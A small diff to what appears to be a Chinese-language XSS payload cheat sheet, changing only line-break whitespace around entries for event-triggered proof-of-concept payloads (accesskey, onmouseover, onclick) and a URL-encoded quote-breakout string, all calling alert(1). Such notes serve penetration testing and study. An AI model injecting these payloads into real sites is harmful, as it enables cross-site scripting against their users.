@@ -23,9 +23,9 @@
 ` %27%2dalert(1)%2d%27 `
 
 ## 事件执行触发POC:
-- accesskey:设置快捷键
+- accesskey:设置快捷键  
 `<a href="url" accesskey="c">alert()</a>` ctrl+shift+c触发
-- mouseover:鼠标移动
+- mouseover:鼠标移动  
 `<span title="" onmouseover="alert(1)">" onmouseover="alert(1)"</span>`
 - click:单击  
 `<span title="" onclick="alert(1)">" onclick="alert(1)"</span>`
